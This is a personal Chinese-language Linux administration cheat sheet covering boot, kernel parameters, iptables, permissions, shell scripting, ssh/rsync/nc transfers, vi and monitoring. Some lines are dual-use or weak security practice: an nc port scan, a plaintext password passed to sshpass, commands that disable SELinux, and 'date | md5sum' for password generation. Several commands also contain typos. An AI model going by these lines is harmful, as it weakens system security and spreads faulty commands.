

shutdown 关机
  -h 关机
  -r 重启
poweroff 关机
reboot 重启
halt -p

运行级别
/etc/inittab   ##配置文件
 0 关机
 1 单用户模式
 2 不带网络的多用户模式
 3 多用户模式
 4 未使用
 5 X11图形化模式
 6 重新启动
runlevel ###显示上一个运行级别和当前运行级别
init 5   ###切换运行级别,系统中运行的第一个进程

启动顺序
BIOS->GRUB

(存储于CMOS)
BIOS(Basic Input Output System)      
EFI(Extensible Firmware Interface)   ##intel公司的bios升级

(存储于磁盘)
GRUB (GRand Unified Bootloader)
###linux使用的主流引导程序，linux上还有LILO
###多操作系统管理器，指定linux内核
/boot/grub/grub.conf   ###配置文件
/boot/grub 
dmesg 查看启动过程

###grub中的最小设置，可以进入编辑界面进行编辑
root	 启动磁盘的位置，可以选择从磁盘 root (hd0,0) / root (cd0,0)
kernel	 内核选择
initrd   初始化RAM磁盘，文件系统可用之前的一个初始化文件系统。作为内核引导的一部分进行加载。



内核参数设置
/etc/sysctl.conf  					##修改该文件中对应的值
sysctl -p  		  					##使修改生效
sysctl vm.overcommit_memory=1		###直接使内核参数生效



swapoff -a                          ##临时关闭swap

###禁用swap
/proc/sys/vm/swapping=0				##禁用所有进程使用swap
vm.swapping=0

OOM out-of memory   				##系统会杀掉一些进程以释放内存

	mysqld --memlock                ##内存锁定             
	vm.nr_hugepage=hugepage_num     ##使用hugepage  巨型页
	 
	
/proc/$pid/smaps					##查看进程的swap的使用
/proc/$pid/maps

cat /proc/$pid/smaps | grep "Swap" 	##查看swap，需要先相加起来
cat /proc/$pid/status | grep "Swap"	##查看swap

pmap -d $pid 
代码段、数据段、堆、文件映射区域、栈
虚拟地址空间使用情况


透明巨型页
echo never > /sys/kernel/mm/transparent_hugepage/enabled    #修改巨型页的使用

透明巨型页的参数
cat /proc/meminfo | grep Huge
需要使用swap时，内存页被分割为4kb

x86的默认内存页大小是4kb，可以使用2mb或者更大的巨型页

echo 2000 > /proc/sys/vm/nr_hugepages  #修改巨型页的数量




rpm -qa | grep kernel   			###rpm安装时查看已经安装的内核
yum list kernel		
rpm -e kernel_name      			###删除内核
uname -r 	            			###查看使用的内核



资源限制
ulimit
cgroups
/proc/cgroups 

##修改最大文件描述符
/etc/security/limits.conf	 		###配置文件修改，最大打开文件数，以及其他
/etc/security/limits.d



ulimit -a							###查看所有的限制
ulimit -n 2048						##修改允许打开最大的文件数
lsof | wc -l						##查看已经打开的文件数
lsof -p pid 						##查看进程打开的文件
ulimit -Hn                          ##查看


quota  				#磁盘使用限制
edquota				#编辑数据文件



pmap pid							##查看指定pid使用的内存


lspci | grep -i vga   ##查看显卡
lspci | grep -i net   ##查看网卡
lspci -v -s 


lspci 查看PCI设备
lsusb 查看USB设备
lsmod 查看加载模块（驱动）
lsblk 查看块设备
ls+tab+tab  查看ls开头的命令
which command	##查看command的路径
whereis command
type command	##查看command的路径


time command    #计算命令执行的时间
date 显示时间
hwclocck/clock 显示计算机硬件时间
cal 显示日历
uptime 系统运行时间

linux版本查看
cat /etc/issue

uname -a
查看【/etc/*-release】文件 
bash (bourne-again shell)  ###linux上大部分默认的Shell，其他shell例如tcsh、csh、ash、bsh、ksh
gnome-session  ##gnome情况



linux下display参数设置
#1 vncserver   ##启动vnc(virtual network computer)
2 export DISPLAY=localhost:n  ##n为1中的启动信息 export DISPLAY=:0.0 
3 xhost +x  ## x可以为主机或用户名，如local:oracle，即指定为本地的oracle用户可以图像界面 不指定x为允许所有
DISPLAY hostname:displaynumber.screennumber  ##DISPLAY参数设置，使用xmanager连接

xclock   ###验证display参数

系统参数
存储位置为用户的跟目录,如weideguo用户为 【/home/weideugo/.bash_profile】
使用【source .bash_profile】在更改后立即生效

/home/weideugo/.bashrc   ###每次打开新shell都自动生效

全局系统参数
/etc/profile

selinux
配置文件/etc/sysconfig/selinux
工作模式 SElinux=permissive
强制（enfocing）：违反策略的行动都被禁止，并作为内核信息记录
允许（permissive）：违反策略的行动不被禁止，但会产生警告信息
禁用（disabled）：禁用SElinux，与不带SElinux的系统一样         
/usr/sbin/sestatus -v      ##如果SELinux status参数为enabled即为开启状态
getenforce                 ##也可以用这个命令检查
setenforce 0  			   ##临时关闭；1 为开启

由selinux设置问题导致启动失败
进入kernel选择界面，编辑kernel，添加 
enforing=0

iptables -t filter -A INPUT -s 192.168.1.1 -j DROP
 -t 表：规定使用的表（filter、nat、mangle、raw）
 -A 链：规定过滤点（INPUT、OUTPUT、FORWARD、PREROUTING、POSTROUTING）
 -s 匹配属性：规定匹配数据包的特征 【源、目标IP地址、协议（TCP/IP）、端口号、接口】
 -j 匹配后的动作：放行、丢弃、记录 【ACCEPT、DROP、REJECT】
 -p tcp 匹配tcp协议
 --dport 22  匹配端口号22

iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 4005		###转换端口
iptables -I INPUT -p tcp --dport 4005 -j ACCEPT											###开放端口


端口映射(内网的端口映射成外网的端口)
iptables -t nat -A PREROUTING -d 10.19.170.205 -p tcp --dport 3306 -j DNAT --to 117.121.27.47:3306
iptables -t nat -A POSTROUTING -d 117.121.27.47 -p tcp --dport 3306 -j SNAT --to 10.19.170.205


SNAT 源地址转换   内网访问外网
DNAT 目的地址转换 外网访问内网


允许指定ip访问指定端口
iptables -I INPUT -s 117.121.27.47 -p tcp --dport 3306 -j ACCEPT

删除规则
iptables -D INPUT 1
iptables -t nat -D PREROUTING 1

清空规则
iptables -t nat -F PREROUTING

修改文件也可以更改规则
/etc/sysconfig/iptables 
 
 
 
保存配置
iptable-save > /etc/sysconfig/iptables
 
/etc/init.d/iptables status  
/etc/init.d/iptables stop 

重启后生效
chkconfig iptables on 
chkconfig iptables off 或者 /sbin/chkconfig --level 2345 iptables off

配置文件
/etc/sysconfig/iptables 
 
 
 
用户管理、权限管理
passwd testuser    ##给已创建的用户设置密码
userdel testuser   ##删除用户
rm -rf testuser    ##删除目录

groupadd group_name  ###添加组
groupmod group_name  ###修改组
groupdel group_name  ###删除组
useradd –s /sbin/nologin –d /var/www/ dengftp
#注-s /sbin/nologin是让其不能登陆系统，-d 是指定用户目录为/var/www/ 
#添加用户时可以使用【-g、-G】参数关联到对应的组
chown –R user_name:group_name /var/www/   #注:将用户目录及其子目录的所有和所属的组设置为dengftp
chmod 774 /var/www/
chgrp group_name file_name  ###修改文件所属组
chmod -R 774 /var/www/  ###更改目录及目录下所有文件的权限
id -a user ###查看user所属的组
usermod    ##修改用户的信息，如修改所属组、home文件、密码、uid
userdel user_name ##删除用户   (加 -r 删除用户目录）
/etc/passwd  ##保存用户信息
/etc/shadow  ##保存用户密码
/etc/group   ##保存组信息

umask -S   	 ###查看用户创建文件时文件的默认权限
umask 002    ###修改文件的默认权限，为 666-002
			 ###文件夹777-002
添加执行sudo的权限为在sudoers文件【/etc/sudoers】中添加
visudo          				###直接进入编辑/etc/sudoers   也可以用vi编辑，写入的时候强制写入
sudo ${command}  				###以root用户执行命令

sudo -u db_user00 ${command}   	##以指定用户执行命令

sudo /bin/su - db_user00 /data/db_user00/redis_6379/redis_server.sh start   ##以root用户身份执行su ...

runuser -l db_user00 -c "${command}"  ##root账号以特定用户执行



whoami ##显示当前用户
who    ##显示登陆用户
w      ##显示登陆用户并且现在干嘛

chmod
- 第一组rwx：文件所有者的权限是读、写和执行
- 第二组rw-：与文件所有者同一组的用户的权限是读、写但不能执行
- 第三组r--：不与文件所有者同组的其他用户的权限是读不能写和执行
可用数字表示为：r=4，w=2，x=1  因此rwx=4+2+1=7

chroot $NEWROOT $COMMAND   ####run command or interactive shell with special root directory

ACL（access control list）
mount -o acl /dev/sda5 /mnt     ###ACL需要在挂载文件的时候打开ACL功能
getfacl file_name   					###查看一个文件的ACL设置
setfacl -m u:username:rwx file_name   	###设置用户权限
setfacl -m g:groupname:--x file_name 	###设置组权限
setfacl -x u:username file_name   		####删除ACL设置

文件管理
tar –xvf file.tar        ##解压 tar包
tar -xzvf file.tar.gz    ##解压tar.gz
tar -xjvf file.tar.bz2   ##解压 tar.bz2
压缩/解压
bzip2 
gzip	
xz
	
awk '{print $1}' filename  			####显示文件中每行第一个字符串
awk -F':' '{print $1}' filename    	####使用分割符":"分割并显示每行第一个字符
awk -F":" '{print $1}' filename
awk -F":" '/exp/{print $1}'			###查找符合exp的行并进行分割，可以使用正则表达式
awk '/exp/'

sed [-nefri] 'command' filename     		####编辑文字  删除、替换  
sed 's/lintxt1/linetxt2/g'	filename		####替换字符 将文件中的linetxt1替换成linetxt2 可以使用正则表达式
sed 's|lintxt1|linetxt2|g'	filename
sed '/linetxt/d' filename					####删除匹配的行  将配备linetxt的行删除 可以使用正则表达式

echo "\e[1;33m ok !! \e[0m"   ##高亮

echo "xxx" | xargs                          ##设置标准输出

xargs - build and execute command lines from standard input

tr '.' '_'	filename						##将【.】替换为【_】，-d为删除
tr -s " " filename							##去除空格


list的使用
ip=($ip1 $ip2 $ip3)		###以空格分割
${ip:1:2 }				###显示list中下标1到2的元素
${str#exp}									###字符串str截去exp，截取操作可以使用类似命令

cut -d '#' -f 1 filename					###以"#"分割字符串并获取第一个值
 
grep -o 'exp' filename 						###查找只符合exp中的字符串，可以使用正则表达式  不用-o则匹配行
grep -oP "(?<=//).*?(?=/)"					###-P perl类型的正则表达式，支持零宽断言

grep -v "exp" filename						###反向选择，获取不包含exp的行

uniq filename								###获取的行没有重复，-d获取有重复的行

cmp filename1 filename2						###逐位比较两个文件
diff										###逐行比

basename $path/filename						###从全录路径中提取文件名
basename $path/filename.txt	.txt			###从全录路径中提取文件名并去掉后缀
 
 
##正则表达
"sinosy_${DATE}_*.log"	双引号可以禁止通配符扩展，但是允许变量扩展。
'sinosy_${DATE}_*.log'	同时禁止通配符扩展与变量扩展。
sinosy_${DATE}_\*.log	使用转义字符——反斜杠，也可以防止扩展。

date -d @141231322

cat ctl | grep -v ^- | grep -v ^$  ###去除【-】开头的行及去除空行
## ^正则表达式中字符串的开始 $正则表达式中字符串的结束


排序
sort -rn -k 1 -t: file_name   
####对文件的行以【:】分割，以第1列排序。不指定【-t】则默认为空格符。
####【-r】逆序；【-n】以10进制排序

test -d 'path_name1' || mkdir 'path_name2'     
###【test -d】判断路径是否为目录
###前一条件为假则执行后面的语句

curl  ##运行url，如下载文件

curl -d "p1=v1&p2=v2" "http://example"  #post




wget  ##通过url下载
scp local_file remote_username@remote_ip:remote_filefolder   ##从本地复制到远端，反过来即为远端复制到本地

scp -oPort=3600 -r ...
-oPort  ##指定使用的端口
-r      ##复制目录
-C		##压缩传输


sshpass -p my_password scp ...
sshpass -p my_password ssh ...
ssh [user@]hostname [command]   #远程执行


压缩传输
tar czf - filename | ssh remote_user@remote_host tar xzf - -C remote_path
tar czf - filename | ssh -p 222 remote_user@remote_host tar xzf - -C remote_path  #ssh不是使用默认22端口时指定端口
gzip -c filename | ssh remote_user@remote_host gunzip > filename		#本地传到远端
ssh remote_user@remote_host gzip -c filename | gunzip -c > filenme      #远端传到本地
ssh remote_user@remote_host gzip -c filename > filenme.gz				#传输后不解压

scp -C filename remote_user@remote_host:remote_path

rsync -zav --rsh='ssh -p 22' filename remote_user@remote_host:remote_path

-z 压缩

--bwlimit 限制带宽

nc传输
host2传输到host1
host1: nc -l 1234 | tar zxvf -
host2: tar zcvf - test | nc 192.168.1.176 1234


telnet   #退出
ctrl+]   


rsync
两种模式
C/S 
	server
		rsync --daemon --config=/data/rsyncd.conf
	client
		rsync -azvrP path_to_send rsync://remote_user@remote_host:port/block_name		##block_name为server端配置文件中的块名
		
命令行
		rsync [OPTION]... SRC [SRC]... [USER@]HOST::DEST             ##从源端（SRC，可以多个）同步文件到目的端（DEST）

ssh -p 3600 10.0.0.1

客户端	
rsync rsyncd.secrets --password-file=test.secrets rsync://remote_user@remote_host:port/block_name	
	
使用密码文件权限必须其他账号不能访问	
	

	





	
ssh (secure shell)   	###远程登录
ssh信息保存在/home/user_name目录下.ssh隐藏文件夹内

ssh-keygen	-t rsa -b 2048			###生成ssh密钥
ssh-copy-id	-i /home/user_name/.ssh/id_rsa.pub remote_user_name@remote_ip		###安装公钥到远程主机
###远程主机生成一个在/home/.ssh/authorized_keys，内容与生成的公钥一致。多个公钥则在内容中累加
##设置完毕即可由本地使用私钥无密码登陆到远程主机

重启ssh
service sshd restart
/etc/init.d/sshd restart

secureCRT密钥连接linux
使用secureCRT创建密钥 tool->create public key
将生成的公钥Identity.pub复制到linux的/home/user_name/.ssh/authorized_keys   

在linux下配置/etc/ssh/sshd_config			##默认已经设置，无需更改
RSAAuthentication yes						##启用RSA认证登陆
PubkeyAuthentication yes					##启用RSA公钥
AuthorizedKeysFile .ssh/authorized_keys		###文件名称对应.ssh下的公钥
PasswordAuthentication no					###禁用密码登陆


nc
###端口扫描
nc -v -w 2 -z 192.168.5.230 21       		

###监听端口
nc -lp 65500   				###旧版
nc -l 65500    				###新版

nc -lp 65500  &				##后台运行
nc -l -w 10000 6500 &		##

###远程复制 host2到host1
##1234为端口，没有限制;操作步骤有要求
host1: nc -l 1234 > text.txt
host2: nc host1_ip 1234 < text.txt  	

host1: nc -l 1234 | tar zxvf -
host2: tar zcvf - text.txt | nc host1_ip 1234

###聊天
host1: nc -lp 1234
host2: nc host1_ip 1234

###操作memcached
print "get key_name" | nc $ip_address $port


###查看命令
cat
more
tail

find ./ -name "file_name"  ##当前文件以名字查找
find ./ -name "*test*" –type f -exec rm -rf {} \;   ###查找当前目录下指定文件并删除 ##【-exec command ;】匹配后执行command
find ./ -name "*test*" –type d						###查找当前目录下指定的目录
find ./ -type f -ctime +14 -exec rm -rf {} \;		##查找时间离现在大于14天的文件，删除


wc -l   ###计算行数
wc      ###文本计数

strings binary_file      ###查看二进制文件

##将文档写入文件
cat >>./filename <<EOF
${linetxt}
EOF

mysql ... <<
use xxx;
create ...
EOF




x=`cat`				###脚本中从输入获取字符串

tee filename 		##将输入写入文件中

echo "xyz" > filename    ###清空文件并写入
echo "xyz" >> filename 	 ###在尾部追加写入


stdbuf -oL	${command} > out.log
#以行为缓冲单位重定向命令的输出，即命令输出一行，写入文件一行


VI列编辑
crtl+v 进入列模式
shift+i 插入
ESC两次 退出列模式



VI
使用【Esc键】切换由插入模式进入命令模式（command mode、insert mode）
由命令模式进入插入模式
按 i 切换进入插入模式后，是从光标当前位置开始输入文件；
按 a 进入插入模式后，是从目前光标所在位置的下一个位置开始输入文字；
按 o 进入插入模式后，是插入新的一行，从行首开始输入文字。

删除文字
x ：每按一次，删除光标所在位置的一个字符。
#x ：删除光标所在位置的后面#个字符。
X ：每按一次，删除光标所在位置的前面一个字符。（shift+x 也可以）
#X ：删除光标所在位置的前面#个字符。
dd ：删除光标所在行。
#dd ：从光标所在行开始删除#行。

退出及保存文件
:w （保存当前文件）
:w filename （将文件以指定的文件名“filename”保存）
:wq （保存并退出vi）
:wq filename（将正在编辑的文件保存为“filename”文件退出vi）
:q （退出vi）
:q! （不存盘强制退出vi）
:x （相当于 :wq 的功能）

恢复上一次操作
u ：如果您误执行一个命令，可以马上按下 u ，回到上一个操作。按多次 u 可以执行多次恢复。

复制粘贴
yw ：将光标所在之字符串复制到缓冲区中。
#yw ：复制#个字串到缓冲区。
yy ：复制光标所在行到缓冲区。
#yy ：复制从光标所在行往下#行文字。
p ：将缓冲区内的字符贴到光标所在位置。

替换更改
r ：替换光标所在处的字符。
R ：替换光标所到之处的字符，直到按下 ESC 键为止。
cw ：更改光标所在处的字到字尾处
#cw ：更改多个字符

移动光标
vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母 h 、 j 、 k 、 l ，分别控制光标左、下、上、右移一格。
按 G ：移动到最后一行行尾。   （键盘为shift+G）
按1G ：定位到第一行，第n行同理（1+shift+G）
按 $ ：移动到光标所在行的行尾。
按 0 ：移到当前行的开头。
#G ：移动光标至文件的第#行行首
按 Ctrl+b ：屏幕往后移动一页。
按 Ctrl+f ：屏幕往前移动一页。
按 Ctrl+u ：屏幕往后移动半页。
按 Ctrl+d ：屏幕往前移动半页。
Ctrl+g 列出光标所在行的行号。

按 ^ ：移动到光标所在行的行首。
按 w ：光标跳到下个字的开头。
按 e ：光标跳到下个字的字尾。
按 b ：光标回到上个字的开头。
按 #l ：光标往后移的第#个位置。

显示行号
:set number
关闭行号
：set nonu
/string		向前搜索指定的字符
?string		向后收索指定的字符
n			收索下一个字符串

linux中的文件标识
l是链接，相当于windows的快捷方式
d是目录，相当于windows的文件夹
c是字符设备文件，鼠标，键盘
b是块设备，如硬盘
s套接文件，如mysql启动时生成的mysql.sock

ln existingfile newfil       ###硬链接(hard link)  ##源文件删除后链接文件还可以读取e
ln -s existingfile newfile   ###软链接(soft link)   ###源文件删除后链接文件同时失效

linux文件夹
bin 	可执行文件（命令）所有用户
boot 	引导目录，内核保存于其中  
dev 	被抽象为文件的硬件设配
etc 	配置文件
usr 	保存装的应用软件
root 	root用户文件
home 	用户私有数据
lib 	库文件
sbin 	可执行的二进制文件（超级用户才可执行）
media  	挂载文件
mnt 	挂载文件
opt 	装大型软件（非强制）
proc 	虚拟文件夹（保存在内存中的实时信息）
sys 	底层硬件信息
var 	保存经常变化的信息（如log，保存的是日志）
tmp 	临时目录（系统会自动删除）


进程管理
ps -ef | grep java   	##查看有关与java的进程
pgrep java


service vsftpd start  	##启动程序
service vsftpd stop   	##结束进程
crontab -l           	##让使用者在固定时间或固定间隔执行程序之用
						## -l 查看 、-e 编辑
/var/log/cron			##crontab日志
						

logger 					##写日志进入/var/log/messages					
						
						
						
pidof ${command}		##查看当前命令的pid			

kill -SIGUSR1 ${pid}	##将pid对应命令的日志进行分割					
	
线程管理
ps -T					##查看所有线程
ps -T -p $pid			##查看某个进程的线程
ps -eLo pid,lwp,psr,args | grep qemu   #第三列代表线程运行的第几个cpu


ps -xH   #查看所有线程


ps aux   
#rss  占用的物理内存，包含调用的.so共享文件
#vss  占用的虚拟内存

#tty  teletypes、teletypewriters  终端
#pty  pseudo tty  虚拟终端


ps -eF
#SZ  由进程单独占用的物理内存
#PSR 进程占用的处理器数量
#STAT 线程、进程状态

D uninterruptible sleep (通常io使用)
R running or runnable (on run queue)
S interruptible sleep (waiting for an event to complete)
T stop
W paging(2.6+内核不适用)
X dead(不会被看到)
Z defunct ("zombie") process (终止但未被父进程回收)

< 高优先级
N 低优先级
L 在内存中
s is a session leader
l is mult-threaded
+ is in the foreground process group


ps -ely 



ps -U user_name   #查看用户当前运行的进程

ps -ejH   #查看进程树
ps axjf   

pstree $pid				##查看进程、线程的层级


top                     ##使用子命令H查看线程，Tasks数增多

ulimit -u				##当前用户的最大线程数查看
ulimit -u 2048			##修改当前用户的最大线程数


						
prtconf -m  		##AIX查看物理内存
prtconf  			##查看物理参数
prtconf | more    	##分页查看					 
free -m   			##内存与swap查看   ###SWAP用作虚存分区
	
	total   总内存
	used    已经使用的内存
	free    空闲内存
	shared  当前废弃不用的内存
	buffer  buffer cache内存
	cached  page cache内存

	-buffer/cache =used-buffers-cached  程序占用的内存
	+buffer/cache =free+buffers+cached  可以挪用的内存




top  	  			###查看系统运行状态   AIX使用topas
###top的内部命令 在执行top后输入
h	##帮助说明
	%us user cpu time   执行用户进程的时间
	%sy system cpu time 在内核空间运行的cpu时间
	%ni user nice cpu time (% CPU time spent on low priority processes)
	%id idle cpu time
	%wa io wait cpu time (% CPU time spent in wait)
	%hi hardware irq (% CPU time spent serving/handling hardware interrupts)
	%si software irq (% CPU time spent serving/handling spftware interrupts)
	%st steal time (% CPU time in involuntary wait by virtual while hypervisor is servicing another processor)

	
	VIRT virtual memory usage  进程"需要"虚拟内存大小，包括进程使用的库、代码、数据
	RES resident memory usage
	SHR shared memory 
	DATA 数据占用的内存
	
	RES-SHR  计算进程占用物理内存

f 选择显示的内容	
	
	
	
	
iostat -d -x -k 1 10    ##查看io信息间隔一秒查询，查10次

-d #只显示disk的信息
-c #只显示cpu的信息

	%util  #在统计时间内（所有处理io的时间/总时间）

	
pidstat -r -p PID      #查看进程的内存使用	
	
	
	
	
badblocks -s -v sdb1   ##坏道检测
hdparm sdb1			   ##磁盘信息获取


numactl 			##控制进程与共享存储的numa技术

numctl --interleave=all ${command}
#当当前cpu没有可以分配的内存，可以使用其他cpu的内存。all表示所有
#不设置时当达到cpu的分配阈值，即使系统还有空余内存，也不分配给当前cpu，而选择使用SWAP



SMP	symmetic multi processing					对称多处理系统
MPP  massvie parallel processor    				大规模并行处理
NUMA non uniform memory access architecture		非统一内存访问


vmstat				###查看虚拟内存
vmstat -S m 1		###隔1秒显示一次
sar 				###系统活动信息

/proc/meminfo		##内存信息
/proc/cpuinfo       ##查看CPU信息
/proc/interrupts    ##中断信息

cat /proc/cpuinfo | grep processor | wc -l   ##cpu核数

netstat -nlap |grep .21|more  ##查看端口21 ftp服务器启动不得时可能时端口被占用的问题
netstat -nlt | grep 3306
netstat -nat                  ##连接数查看

netstat -ntlpa                ##查看连接      


setup  		##进入图形化设置界面
xmanager 	###远程桌面软件，可以使用图形界面
eval    	###先扫描命令行进行变量替换，然后再执行命令  eval {command} $var

AIX  显示10个消耗cpu最多的进程
ps aux |head -1 ;ps aux |sort -rn +2 |head -10   ###修改【sort -rn +x】指定由第x+1列排序


ps -p pid -o lstart   #查看进程启动时间



ll /proc/PID    #查看进程的绝对路径

cwd 进程运行的目录
exe 执行程序的绝对路径
cmdline 程序运行的输入的命令
environ 进程运行时的环境变量
fd 进程打开或使用的文件符号连接





head -n 1  #前一行
head -c 1  #前一个字符


/etc/rc.d/init.d/service_name    ### linux服务设置；如【service xxx start】为调用脚本时传入【start】参数

crontab  ####任务调度   设置可执行程序的定时运行
crontab -l   ###查看
crontab -e   ###编辑  使用方法与vi类似

开机启动设置
/etc/rc.d   ###/etc目录下的相关设置是链接    
##Linux在启动时，会自动执行/etc/rc.d目录下的初始化程序，可以把启动任务放到该目录下
rc.local是在完成所有初始化之后执行的

/usr/lib/systemd/system   #centos7 service文件位置

通过服务设置自启动
chmod +x /etc/rc.d/init.d/simpleTest	使之可直接执行
chkconfig --add simpleTest    			把该服务添加到配置当中
chkconfig --list simpleTest    			可以查看该服务进程的状态

##linux与window的文件传输 使用ZModem协议
sz  将选定的文件发送到本地
rz	交互窗口 rz -bey

FTP
vim /etc/vsftpd/chroot_list  
#将dengftp添加到此文件中，这样打开ftp 的时候自动定位到根目录下
service vsftpd restart 

ftp模式
! 执行外壳命令 如 !ls
delete
mdelete
put
mput
get
mget

dirname $path1/filename.txt			###显示文件的父目录
pwd									###显示当前目录


mkfifo my_pipe  					##创建管道，"|"为无名管道

###进程一
echo "abcd" > my_pipe				###写入管道时没有读取操作，写入操作会停滞
###进程3二
cat my_pipe							###读取管道时没有数据，读取操作会停滞

rm -rf my_pipe						###删除管道


posix标准要求每次打开文件时必须使用当前进程的最小可用文件描述符。


文件描述符
/proc/self/fd
0	stdin
1	stdout
2	stderr

使用exec自定定义、绑定文件操作符
exec 200<>my_pipe   ###对文件200的操作等同于对管道my_pipe的操作。使用绑定文件可以避免停滞
			
echo >&200			###以管道使用，输入空行，不停滞
read -u200			###读取管道，以行读取，如果读取不到则停滞
					
exec 200>&-			###关闭绑定
exec 200<$-



read -u n			###从描述符号位n的文件中读取。缺省为0，即为stdin。

read -p "prompt" arg	###输出提示，将输入值传给arg。没有arg则传入REPLY


cat filename | while read line		###将文件读入line中，line为变量
do
${command} $line
done

read arg_name						##从终端读取数据赋值给变量，可以有多个变量名
-p "you commemt"	输出提示字符


set -- p1 p2 p3     
##重置位置参数
##$1    ##为p1
##$2    ##为p2
##$3    ##为p3


SHELL脚本
参数
变量说明: 
$$ #Shell本身的PID（ProcessID） 
$! #Shell最后运行的后台Process的PID 
$? #最后运行的命令的结束代码，即获取函数返回值 
$- #使用Set命令设定的Flag一览 
$* #所有参数列表。如"$*"用「"」括起来的情况、以"$1 $2 … $n"的形式输出所有参数。 
$@ #所有参数列表。如"$@"用「"」括起来的情况、以"$1" "$2" … "$n" 的形式输出所有参数。 
$# #添加到Shell的参数个数 
$0 #Shell本身的文件名 
$1-$n #添加到Shell的各参数值。$1是第1参数、$2是第2参数…。

###逐个获取脚本后的参数 opt不是关键字，可以使用任意名字
for opt do
	echo $opt
done

shift 参数移动，用于逐个获取参数

x=`date +%Y`   ###执行命令后将结果保存在变量中
x=$(date +%Y)

首行,代表使用的命令，相应目录必须正确
#!/bash/sh  
函数
xyz()				  ##可在前面添加function前缀
{
	let a=$1+$2+$3    ##参数为 $1,$2,$3...以此类推，let指定后面为数学计算，可用((a=$1+$2+$3))代替
	return $a		  ##函数返回值，运行函数后使用$?获取
}
xyz 1 4 5            ##执行函数，后面为参数
echo $?               ##输出返回值

for                   ##for循环，可以使用((i=0;i<10;i++))
do
...
done

for i in 1 2 3 4 5    ## for i in `seq 5`
do
....
done

while				  ##while循环，可以使用((i<10))
do
...
done

if
then
...
else
...
fi

if [ $a -gt 0 ] 2>/dev/null;then    ###将错误信息忽略
echo "is number"
else 
echo "is not number"
fi

${command} > out.file 2>&1    	####将错误的输出定向到标准输出

0	标准输入。键盘输入，并返回在前端。
1	标准输出。正确返回值，输出到前端。【1>】可以直接表示成【>】， &1表示1通道
2	标准出错。错误返回值，输出到前端。

; 表示语句的结束，一行中出现多语句时使用

case $flag in
	start)
	${command1}
	;;
	stop|shutdown)
	${command2}
	;;
	*)
	${command3}
	;;
esac

	

创建临时文件夹模拟回收站
myrm(){ D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D; mv "$@" $D && echo "moved to $D ok"; }
alias rm='myrm'
unalias commad	###删除别名

()、(())、[]、[[]]、{}
()      ##在括号中的命令组，为一个子shell;初始化数组
(())    ##用于计算数值结果，变量可不用加$,
[]	    ##条件测试
[[]]	##
{}		##代码块，如{command1;command2;...}；参数扩展,如 ${xyz}	



${command1} && ${command2}     #前面执行成功才执行后面的语句
${}command1} || ${command2}	   #前面执行失败才执行后面的语句



数组
a="3306,3307,3308"
OLD_IFS=$IFS
IFS=","
arr=($a)
IFS=$OLD_IFS
for s in ${arr[@]}
do
	echo $s
done


z_ip=()
z_ip[1]="123"
z_ip[2]="234"
echo ${z_ip[1]}
echo ${z_ip[@]}



if test (表达式为真)    ###判断  判断文件是否存在等
touch filename  ##创建文件

if [ -z $dc ];then 	 ##字符长度为0
echo "not exist"; 
else 
echo "exist"; 
fi

-e  文件或目录是否存在
-d  目录
-f  文件
-L  符号链接
-r  可读
-w  可写
-x  可执行

filename1 -nt filename2   #文件filename1比filename2更新
filename1 -ot filename2   #文件filename1比filename2更旧

-z $string  字符长度为0
-n $string  字符长度非0


在shell中使用配置文件，使用filename文件中的变量
. filename



环境变量
env  显示所有环境变量
set  显示本地定义的shell变量
unset 变量名  清除环境变量
export 变量名=变量值  设置环境变量


PATH 可执行命令路径
PROMPT_COMMAND  用户执行后执行





shell执行方式
1、产生新的shell执行相应的shell scripts。
	使用方式是在scripts文件中加入  #!/bin/sh
2、不产生新的shell，在当前shell下执行一切命令。
	source命令，使用"."类似,当前进程执行
	exec以新的进程代替原来的进程，PID保持不变
加入【&】在执行脚本后面实现后台运行
nohup command_nam &  ##在后台运行命令command_name

网络
/etc/sysconfig/network-scripts/ifcfg-eth0  ###配置文件
重启网卡 
1. service network restart
2. ifconfig eth0 down   ##etho为网卡名，使用ifconfig -a查看
   ifconfig eth0 up
3. ifdown eth0
   ifup eth0
ethtool eth0    #查看网卡物理特性
ethtool -i eth0 #查看驱动信息
ethtool -s eth0 #查看网卡状态

虚拟ip(vip)
ifconfig eth0:1 192.168.10.100 netmask 255.255.255.0 	 	###eth0为网卡，eth0:1 为子网卡
ip addr del 192.168.10.100 dev eth0:1						###删除


ip [ OPTIONS ] OBJECT { COMMAND | help }

OBJECT := { link | addr | addrlabel | route | rule | neigh | tunnel | maddr | mroute | monitor }
OPTIONS := { -V[ersion] | -s[tatistics] | -r[esolve] | -f[amily] { inet | inet6 | ipx | dnet | link } | -o[neline] }



nsenter     #管理namespace


arping -c 3 -U -I eth0 192.168.10.100							###更新arp

setup         ##进入图形配置界面

ping   		##测试网络连接  
host、dig	##测试DNS解析 
ip route 	##显示路由表
traceroute 	##追踪到达目标地址的网络路径 
mtr			##网络质量测试 
hostname 	##查看主机名  【/etc/sysconfig/network】修改配置文件实现修改主机名，使用【hostname new_hostname】临时修改主机名

netperf     ##测试网络带宽


kill -l 					##列出所有信号名称
stty -a						###查看信号对应的操作

trap '' 1 2 3 15 			###忽略信号，在脚本中使用

trap 'commands' signals 	###接收到信号时执行commands

trap "echo 'hello'" INT		###键盘ctrl+c，执行echo hello命令


关闭ICMP回应(不能使用ping命令连接)
/proc/sys/net/ipv4/icmp_echo_ignore_all   ###设置为0，开启；1，关闭

开启器端路由转发功能
vi /etc/sysctl.conf
net.ipv4.ip_forward = 1


编译安装
cmake  
###【cmkae . -DCMAKE_INSTALL_PREFIX=path_name】,【.】代表当前目录
###由CMakeLists.txt生成Makefile文件。同时生成Cmakecache.txt文件，再次全新执行cmake需要先删除这个文件。

###有些程序使用如configure的脚本配置makefile文件
make  			###默认由Makefile文件执行相应操作，可用于编译，可以由【-f make_filename】指定规则文件
make install  	###默认由Makefile文件执行install操作(以【install:】开头的块)


md5sum 			##计算文件的MD5

sha256sum

base64


随机生成密码
date |md5sum







yum安装软件
yum (yellow dog update,modify)

yum install package_name ##使用yum安装软件，安装包在配置文件中指定
yum install vsftpd  ##安装软件，使用默认yum源
yum remove vsftpd   ##卸载软件
yum install --installroot=/usr/src/ vim   ###安装时指定安装路径
yum install software_name --enablerepo=repo_name 
###由指定yum源安装软件  【repo_name】对应/etc/yum.repos.d/下的文件中【[repo_name]】

main 定义了全局配置选项，整个yum 配置文件应该只有一个main。常位于/etc/yum.conf 中。
